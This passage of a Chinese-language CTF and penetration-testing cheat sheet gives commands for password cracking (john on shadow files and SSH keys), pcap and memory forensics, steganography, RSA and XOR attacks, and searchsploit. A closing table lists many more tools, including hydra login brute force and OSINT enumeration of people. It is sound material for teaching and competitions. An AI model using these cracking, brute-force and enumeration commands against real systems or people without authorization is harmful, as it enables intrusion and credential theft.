**使用场景**:压缩包密码、SSH 私钥密码、/etc/shadow;无 GPU 环境替代 hashcat。

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <hashes.txt>          # 自动识别格式
zip2john <file>.zip > zip.hash && john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
unshadow passwd.txt shadow.txt > unshadowed.txt && john unshadowed.txt # Linux 密码破解
python3 /usr/share/john/ssh2john.py id_rsa > ssh.hash && john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show <hashes.txt>                                               # 查看已破结果
```

**实战要点**:
- `zip2john`/`rar2john` 在 PATH 中;ssh2john 若不在 PATH 用 `python3 /usr/share/john/ssh2john.py`。
- ZIP 先排查伪加密(改加密标志位)再爆破,常有秒解。
- zip 密码破解后用 `unzip -P <password> <file>.zip` 解压。

### tshark — 命令行 pcap 分析

**用途**:以 Wireshark 同款过滤语法批量分析 pcap:协议过滤、字段提取、对象导出、流跟踪。
**安装**:Kali 默认已装(tshark)。
**使用场景**:pcap 取证主力;比 GUI 快且可 grep/排序管道组合。

```bash
tshark -r <file>.pcap | head                       # 快速浏览
tshark -r <file>.pcap -Y "http.request" -T fields -e http.host -e http.request.uri | sort -u
tshark -r <file>.pcap -Y "ftp.request.command == \"PASS\"" -T fields -e ftp.request.arg   # FTP 明文密码
tshark -r <file>.pcap --export-objects http,http_out                # 导出所有 HTTP 传输文件
tshark -r <file>.pcap -q -z follow,tcp,ascii,0                      # 跟踪 0 号 TCP 流
tshark -r <file>.pcap -Y "usb.capdata || usbhid.data" -T fields -e usb.capdata -e usbhid.data  # USB 键盘
tshark -r <file>.pcap -Y "dns" -T fields -e dns.qry_name | sort -u  # DNS 外带数据
```

**实战要点**:
- 过滤器即 Wireshark Display Filter,先在 GUI 调通再到命令行批处理。
- `-T fields -e <字段>` 输出可直接 `sort -u`/`grep`,信息密度最高。
- USB 键盘流量:提取 hid data 后按 HID 键值表人工映射(2 字节,第 2 字节为键码)。

### volatility3 — 内存取证

**用途**:从内存 dump 中提取进程、命令行、网络连接、文件、注册表、注入代码。
**安装**:`sudo apt install volatility3`。
**使用场景**:Forensics 内存题;题目给 raw/vmem/img/dmp 镜像。

```bash
volatility3 -f <dump> windows.info                                    # 镜像基本信息(先跑)
volatility3 -f <dump> windows.pslist                                  # 进程列表
volatility3 -f <dump> windows.cmdline | grep -iE "cmd|powershell|flag"  # 各进程命令行
volatility3 -f <dump> windows.filescan | grep -iE "flag|desktop|download"  # 文件对象扫描
volatility3 -f <dump> windows.dumpfiles --pid <pid>                    # 从进程地址空间转储文件
volatility3 -f <dump> windows.netscan                                 # 网络连接
volatility3 -f <dump> windows.malfind                                 # 可疑注入代码段
volatility3 -f <dump> linux.pslist                                    # Linux 镜像(需对应符号表)
```

**实战要点**:
- 必跑顺序:info → pslist/cmdline → filescan → dumpfiles;99% 的 flag 在命令行或转储文件里。
- filescan 命中后记下物理地址,用 `windows.dumpfiles --physaddr <addr>` 也可提取。
- Linux/特殊版本镜像需要符号表,跑不起来时退回 `strings | grep flag` 兜底。

### sleuthkit — 磁盘镜像取证套件(mmls/fls/icat)

**用途**:按分区与文件系统结构解析磁盘镜像:分区表、文件列表、按 inode 恢复文件。
**安装**:`sudo apt install sleuthkit`。
**使用场景**:dd/E01/raw 磁盘镜像题;恢复"已删除"但 inode 还在的文件。

```bash
mmls <image>.raw                        # 分区表:记下目标分区的 Start 扇区
fsstat -o <start> <image>.raw           # 确认文件系统类型
fls -o <start> -r <image>.raw | grep -i flag     # 递归列文件(含已删除:* 标记)
icat -o <start> <image>.raw <inode> > recovered.bin   # 按 inode 提取文件内容
```

**实战要点**:
- `-o` 偏移单位是"扇区"(mmls 的 Start 列),不是字节。
- fls 输出中 `*` 开头的是已删除条目,inode 仍可用 icat 恢复。
- inode 级恢复失败(数据被覆盖)时退回 photorec 签名雕刻。

### steghide — JPG/BMP/WAV 隐写提取

**用途**:对 JPEG/BMP/WAV 做基于密码的隐写嵌入与提取。
**安装**:Kali 默认已装(steghide)。
**使用场景**:JPG 题第一选择;WAV 隐写也常被忽略。

```bash
steghide info <file>.jpg                  # 查看是否含嵌入数据(会交互式要求 passphrase,可 -p "" 传入空密码)
steghide extract -sf <file>.jpg -p ""     # 空密码提取(必试)
steghide extract -sf <file>.jpg -p <password>
```

**实战要点**:
- 只支持 JPG/BMP/WAV;PNG 不支持(换 zsteg)。
- `info` 会交互式要求 passphrase(可 `-p ""` 传入空密码),无法免密确认是否藏数据;空密码确认直接用 `steghide extract -sf <file>.jpg -p ""` 或 stegseek。
- 空密码失败 → stegseek 跑 rockyou,几秒到几分钟。

### stegseek — steghide 密码暴力破解

**用途**:以接近瞬间速度跑完 rockyou 字典,爆破 steghide 密码并自动提取。
**安装**:`sudo apt install stegseek`。
**使用场景**:确认有 steghide 数据但空密码不对时。

```bash
stegseek <file>.jpg                                          # 不给字典默认用 rockyou.txt
stegseek <file>.jpg /usr/share/wordlists/rockyou.txt -xf out.txt   # -xf 指定提取输出文件
```

**实战要点**:
- 需先 `gunzip` rockyou(stegseek 支持 .gz,但常备解压版)。
- 提取结果默认写到 `<文件名>.out`,用 `-xf` 显式指定。
- 跑完 rockyou 仍失败 → 密码可能在别处(EXIF、题目描述),不要死磕。

### zsteg — PNG/BMP LSB 隐写检测

**用途**:自动扫描 PNG/BMP 全部位平面/通道/扫描顺序的 LSB 隐写,并可直接提取。
**安装**:`sudo gem install zsteg`。
**使用场景**:所有 PNG/BMP 隐写题第一发。

```bash
zsteg <file>.png                    # 默认快速扫描
zsteg -a <file>.png                 # 尝试所有已知方法
zsteg <file>.png b1,rgb,lsb,xy      # 指定:1bit、RGB、LSB、xy 顺序
zsteg -E "b1,rgb,lsb,xy" <file>.png # 提取指定通道的 payload 为文件
```

**实战要点**:
- 输出里找 `text:`/`file:` 行,`file: PNG image` 说明提出来又是一张图(套娃)。
- 命中通道格式为 `b1,rgb,lsb,xy`,用 `-E` 同名参数提取。
- 只支持 PNG/BMP;JPG 有损不能 LSB(改用 steghide)。

### RsaCtfTool — RSA 弱点自动攻击

**用途**:自动组合数十种 RSA 攻击(小指数、Fermat、Wiener、共模等)恢复私钥或明文。
**安装**:`sudo apt install rsactftool`(或 `pipx install rsactftool`)。
**使用场景**:拿到 n、e(±密文)且怀疑密钥弱时的第一发。

```bash
RsaCtfTool --publickey <key.pub> --private                  # 只恢复私钥
RsaCtfTool --publickey <key.pub> --uncipherfile cipher.bin --private   # 私钥+解密一步到位
RsaCtfTool --publickey <key.pub> --attack fermat --private   # 指定攻击(Fermat 破相邻素数)
RsaCtfTool --listattacks                                    # 列出全部可用攻击
```

**实战要点**:
- 加 `--verbose` 看每种攻击的尝试过程,定位是哪种弱点。
- 跑不动时先把 n 丢 factordb.com 查是否已被分解。
- 恢复出私钥后也可 `openssl pkeyutl -decrypt -inkey <私钥> -in <密文>` 手工解。

### xortool — XOR 密钥长度与密钥破解

**用途**:通过重合指数法猜 XOR 密钥长度,再按"明文最常见字符"恢复密钥并输出候选明文。
**安装**:`sudo apt install xortool`。
**使用场景**:已知/疑似 XOR 加密,密钥未知。

```bash
xortool <file>                    # 自动猜密钥长度(输出到 xortool_out/)
xortool -c 20 <file>              # 指定明文最常见字符为空格(0x20,英文文本)
xortool -c 00 <file>              # 明文为二进制/PE 文件
xortool -l 5 <file>               # 已知密钥长度 5
xortool -b -l 5 <file>            # 不确定常见字符时全字符爆破
```

**实战要点**:
- 结果在 `xortool_out/`:`key.csv` 是密钥,`*.out` 是候选明文,逐个 grep flag。
- 密文是 hex 字符串时先 `xxd -r -p` 转二进制再喂 xortool(`-x` 可直接吃 hex)。
- 明文格式判断错会全军覆没:文本用 0x20,可执行文件用 0x00。

### openssl — 密钥/证书/加解密瑞士军刀

**用途**:解析 RSA 公私钥参数、证书信息、标准的对称与非对称加解密。
**安装**:Kali 默认已装(openssl)。
**使用场景**:Crypto 题解析 pem/der、已知密钥解密、查看 n/e/d。

```bash
openssl rsa -pubin -in <key.pub> -text -noout | head      # 公钥:读出 n(模数)、e(指数)
openssl rsa -in <id_rsa> -text -noout                     # 私钥:可读出 p、q、d
openssl x509 -in <cert>.pem -text -noout                  # 证书详情
openssl pkeyutl -decrypt -inkey <id_rsa> -in <cipher>.bin -out plain.txt   # RSA 私钥解密
openssl enc -d -aes-256-cbc -K <hexkey> -iv <hexiv> -in <file>.enc -out out.bin   # 对称解密
```

**实战要点**:
- `Modulus` 即 n,`Exponent` 即 e;`-text` 输出 hex,取前导 0x 前的内容转十进制再进脚本。
- 题目给 DER 格式加 `-inform DER`。
- `-K`/`-iv` 要求 hex 字符串(无 0x 前缀);口令模式用 `-k <password>`。

### searchsploit — 本地 Exploit-DB 搜索

**用途**:离线搜索公开 exploit/POC,一键复制到工作目录。
**安装**:Kali 默认已装(exploitdb)。
**使用场景**:已知目标服务与版本,找现成利用代码。

```bash
searchsploit apache 2.4.49            # 关键词搜漏洞
searchsploit -x <id>                  # 查看完整 exploit 内容
searchsploit -m <id>                  # 复制到当前目录(镜像完整路径)
searchsploit --nmap service.xml       # 从 nmap -sV 输出的 XML 自动搜对应服务漏洞
sudo searchsploit -u                  # 更新漏洞库
```

**实战要点**:
- nmap 先 `-sV -oX service.xml` 再喂给 `--nmap`,命中率比手工关键词高。
- `-m` 复制后先读源码再运行;很多 POC 需改目标地址与回连参数。
- 版本号要精确到小版本;搜不到时放宽关键词或去 exploit-db.com 网页检索。

## 其余工具速查

| 工具 | 一句话用途 | 安装包 | 最常用命令 |
|---|---|---|---|
| whatweb | Web 指纹识别(框架/CMS/服务器) | Kali 默认已装 | `whatweb <url>` |
| nmap | 端口与服务扫描 | Kali 默认已装 | `nmap -sV -sC -p- <ip>` |
| nikto | Web 服务器已知漏洞粗扫 | Kali 默认已装 | `nikto -h <url>` |
| dirb | 字典目录扫描(老牌) | Kali 默认已装 | `dirb <url> /usr/share/wordlists/dirb/common.txt` |
| dirsearch | Python 目录扫描(易扩展) | `sudo apt install dirsearch` | `dirsearch -u <url> -e php,html,zip` |
| feroxbuster | Rust 高速递归目录扫描 | `sudo apt install feroxbuster` | `feroxbuster -u <url> -w <wordlist> -x php -d 2` |
| ffuf | 高速模糊测试工具 | `sudo apt install ffuf` | `ffuf -u <url>/FUZZ -w <wordlist> -fc 404` |
| wfuzz | 多参数模糊测试 | Kali 默认已装 | `wfuzz -w <wordlist> -u <url>/FUZZ --hc 404` |
| wpscan | WordPress 专项扫描 | Kali 默认已装 | `wpscan --url <url> --enumerate u,ap,at` |
| jwt-tool | JWT 解码/伪造/弱密钥爆破 | `sudo apt install jwt-tool` | `jwt-tool <token>` |
| hydra | 在线服务登录爆破 | Kali 默认已装 | `hydra -l <user> -P <wordlist> <ip> ssh` |
| git-dumper | 恢复泄露的 .git 源码 | `pipx install git-dumper` | `git-dumper <url>/.git/ <outdir>` |
| ropper | ROP gadget 搜索(ROPgadget 替代) | `sudo apt install python3-ropper` | `ropper --file <file> --search "pop rdi"` |
| one_gadget | libc 中找 execve gadget | `sudo gem install one_gadget` | `one_gadget <libc.so.6>` |
| seccomp-tools | 分析 seccomp 沙箱规则 | `sudo gem install seccomp-tools` | `seccomp-tools dump ./<file>` |
| patchelf | 修改 ELF 解释器与依赖 libc | `sudo apt install patchelf` | `patchelf --set-interpreter <ldPath> --replace-needed libc.so.6 <libcPath> ./<file>` |
| qemu-user | 跨架构运行 ARM/MIPS 程序 | `sudo apt install qemu-user` | `qemu-aarch64 -L /usr/aarch64-linux-gnu ./<file>` |
| ltrace | 跟踪库函数调用 | Kali 默认已装 | `ltrace ./<file>` |
| strace | 跟踪系统调用 | Kali 默认已装 | `strace ./<file>` |
| cutter | rizin 的 GUI 前端 | `sudo apt install cutter` | `cutter <file>` |
| jadx | APK 反编译出 Java 源码 | `sudo apt install jadx` | `jadx <file>.apk -d <outdir>` |
| apktool | APK 解包(smali/资源) | `sudo apt install apktool` | `apktool d <file>.apk` |
| uncompyle6 | Python 字节码还原源码(≤3.8) | `pipx install uncompyle6` | `uncompyle6 <file>.pyc` |
| upx | UPX 脱壳/加壳 | `sudo apt install upx-ucl` | `upx -d <file>` |
| wireshark | 图形化协议分析 | Kali 默认已装 | `wireshark <file>.pcap` |
| capinfos | pcap 元信息概况 | Kali 默认已装(wireshark-common) | `capinfos <file>.pcap` |
| editcap | pcap 格式转换/切分 | Kali 默认已装(wireshark-common) | `editcap -F pcap <in>.pcapng <out>.pcap` |
| mergecap | 合并多个 pcap | Kali 默认已装(wireshark-common) | `mergecap -w merged.pcap <a>.pcap <b>.pcap` |
| tcpdump | 命令行抓包/读包 | Kali 默认已装 | `tcpdump -r <file>.pcap -A \| grep -i pass` |
| pcapfix | 修复损坏的 pcap 头 | `sudo apt install pcapfix` | `pcapfix <file>.pcap` |
| foremost | 按签名雕刻恢复文件 | `sudo apt install foremost` | `foremost -t jpg,png,pdf -i <file> -o <outdir>` |
| bulk_extractor | 镜像批量提取 URL/邮箱/证书 | `sudo apt install bulk-extractor` | `bulk_extractor -o <outdir> <image>` |
| testdisk | 恢复分区表(GUI/TUI) | Kali 默认已装 | `testdisk <image>` |
| photorec | 按签名雕刻删除文件 | Kali 默认已装 | `photorec <file>` |
| sqlite3 | 命令行操作 SQLite 数据库 | Kali 默认已装 | `sqlite3 <file>.db ".tables"` |
| pdftotext | 提取 PDF 文本层 | Kali 默认已装(poppler-utils) | `pdftotext <file>.pdf -` |
| stegsolve | 图片通道/位平面可视化(Java) | 下载 stegsolve.jar | `java -jar stegsolve.jar` |
| stegsnow | 文本空白隐写提取 | `sudo apt install stegsnow` | `stegsnow -p <password> <in>.txt <out>.txt` |
| outguess | JPG 统计隐写提取 | `sudo apt install outguess` | `outguess -r -k <key> <file>.jpg <out>.txt` |
| pngcheck | PNG 结构与 CRC 校验 | `sudo apt install pngcheck` | `pngcheck -v <file>.png` |
| ffmpeg | 音视频转码/抽帧/频谱图 | Kali 默认已装 | `ffmpeg -i <in>.wav -lavfi showspectrumpic spec.png` |
| fcrackzip | ZIP 密码爆破 | `sudo apt install fcrackzip` | `fcrackzip -u -D -p <wordlist> <file>.zip` |
| CyberChef | 浏览器内编码/加解全能工具 | 浏览器 | https://gchq.github.io/CyberChef(Magic 一键猜编码) |
| quipqiup | 古典替换密码自动求解 | 浏览器 | https://quipqiup.com |
| factordb | 大整数分解在线库 | 浏览器 | https://factordb.com(查 n 是否已分解) |
| crackstation | 大规模哈希在线破解 | 浏览器 | https://crackstation.net |
| python3-sympy | 数论运算(分解/模逆) | `sudo apt install python3-sympy` | `python3 -c "from sympy import factorint; print(factorint(<n>))"` |
| pycryptodome | Python 加密库(AES/RSA) | `pip install --break-system-packages pycryptodome` | `python3 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(<m>))"` |
| theHarvester | 域名邮箱/子域/IP 收集 | Kali 默认已装 | `theHarvester -d <domain> -b all` |
| sherlock | 用户名跨平台枚举 | `sudo apt install sherlock` | `sherlock <username>` |
| holehe | 邮箱注册平台检测 | `sudo apt install holehe` | `holehe <email>` |
| maltego | 关系图谱化 OSINT(GUI) | Kali 默认已装 | `maltego` |
| spiderfoot | 自动化 OSINT 框架(Web UI) | `sudo apt install spiderfoot` | `sf -l 127.0.0.1:5001` |
| recon-ng | 模块化侦察框架 | Kali 默认已装 | `recon-ng` |
| metagoofil | 按域名收集公开文档 | `sudo apt install metagoofil` | `metagoofil -d <domain> -t pdf -l 20 -n 5 -o <outdir>` |
| whois | 域名注册信息查询 | Kali 默认已装 | `whois <domain>` |
| dig | DNS 记录查询 | Kali 默认已装(dnsutils) | `dig <domain> any +short` |
| shodan | 互联网设备/服务搜索 CLI | `pipx install shodan`(需 API key) | `shodan search "<query>"` |

---

> 本手册仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景,严禁用于任何未授权测试。
